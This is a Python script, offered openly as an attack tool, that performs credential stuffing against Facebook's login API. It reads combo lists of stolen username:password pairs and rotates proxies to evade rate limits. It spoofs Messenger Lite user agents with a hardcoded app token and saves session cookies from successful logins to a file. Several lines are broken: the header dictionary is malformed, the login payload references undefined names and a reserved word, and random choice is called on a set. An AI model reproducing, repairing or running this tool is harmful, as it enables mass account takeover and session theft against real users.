import json
import random
import uuid
import httpx
import asyncio


class Main:
    def __init__(self) -> None:
        self.proxies = open("proxies.txt", "r").read().splitlines()

    @staticmethod
    def __base_headers() -> (json and dict):
        return {
            "Host"   : "b-api.facebook.com",
            "accept-language"  : "en-US,en;q=0.9",
            "accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "authorization"  : f"OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
            "cache-control"  : "max-age=0",
            "User-Agent": Main.__base_useragent(),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        }

    @staticmethod
    def __base_useragent():

        __user_agent = {
                    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko) [FBAN/MessengerLite;FBAV/115.0.0.2.114;FBPN/com.facebook.mlite;FBLC/ar_EG;FBBV/257412622;FBCR/Orange - STAY SAFE;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi 7;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1369};]" ,
                    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi 7 MIUI/V11.0.6.0.PFLMIXM) [FBAN/MessengerLite;FBAV/115.0.0.2.114;FBPN/com.facebook.mlite;FBLC/ar_EG;FBBV/257412622;FBCR/Orange - STAY SAFE;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi 7;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1369};]"
        }

        return random.choice(__user_agent)

    async def __login_req(
        self, client: httpx.AsyncClient, username: str, password: str
    ) -> str:
        try:
            __login_payload = {
                f"email={user}&password={pass}&credentials_type=password&error_detail_type=button_with_disabled&format=json&device_id=cdc4558c-4dd4-4fd0-9ba6-d09e0223d5e5&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&method=auth.login" 
            }

            resp: httpx.Response = await client.post(
                url = "https://b-api.facebook.com/method/auth.login",
                headers = Main.__base_headers(),
                data = __login_payload,
                follow_redirects=True
            )
            if "logged_in_user" in resp.text:
                with open("cookies.txt", "a") as x:
                    x.write(str(resp.cookies) + "\n")
                
        except:
            await self.__login_req(client, username, password)

    async def start(self) -> None:
        proxy = random.choice(self.proxies)
        __http_proxy= {
            "http://": f"http://{proxy}",
            "https://": f"http://{proxy}"
        }

        async with httpx.AsyncClient(proxies = __http_proxy, timeout=5) as client:
            __async_tasks = []
            for combo in open("combolist.txt", "r").read().splitlines():
                username, password = combo.split(":")

                __async_tasks.append(
                    asyncio.ensure_future(
                        self.__login_req(
                            client=client, password=password, username=username
                        )
                    )
                )
                
                await asyncio.gather(*__async_tasks)

if __name__ == "__main__":
    asyncio.run(Main().start())

